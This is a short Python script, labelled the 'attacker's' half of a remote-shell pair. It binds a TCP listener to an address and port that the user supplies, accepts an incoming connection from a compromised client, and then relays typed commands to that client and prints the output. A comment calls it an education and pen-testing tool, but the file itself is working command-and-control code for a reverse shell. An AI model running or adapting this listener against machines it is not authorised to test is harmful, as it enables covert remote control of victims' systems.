#================Python version 3.7.3================
# This tool is intented for education use and
# Pen-testing only! Misuse will have legal 
# Consequences! You have been warned!
#==========This is the "attacker's" script===========
import socket
import sys


# This function handles the connection to the client
# @param s - the client's socket, gets passed on from the listener
def client_connected(s):
    # Go into a loop of sending and receiving data
    while True:
        try:
            # Grab command from user
            message = input("#>")
            # If the message is not empty, send it to the client
            if len(message):
                # Only bytes can be sent accross, so encode the string
                s.send(bytes(message,"utf-8"))
                # Receive the first 4kb of data from the client
                received_data = s.recv(4096)
                # Decode data from bytes to string and display it
                received_message = received_data.decode()
                print(received_message)
        except:
            sys.exit(0)


# This function sets up the listener and then passes the client's socket
# to the client_connected function
def start_listener():
    try:
        print("Please specify the address to listen on!")
        # The Address that the client will connect to, of type "string"
        HOST = input("#>")
        print("Please specify the port to listen on!")
        # The Port that the client will connect to, will be converted to "integer"
        PORT = input("#>")
        # Create a new socket object, without a specificly defined type (UDP/TCP)
        s = socket.socket()
        # Bind the socket to the address and port, note that Port has to be type int
        s.bind((HOST,int(PORT)))
        # Start listening for an incoming connection
        s.listen(True)
        print("Listening on " + HOST +":"+PORT)
        # Accept an incoming connection into a new socket object and also get the address
        client_socket, client_address = s.accept()
        print("Client "+ str(client_address[0])+":"+str(client_address[1])+" connected!")
        # Start connection handler, give it the client's socket
        client_connected(client_socket)
    except:
        sys.exit(0)


# Main function
if __name__ == "__main__":
    start_listener()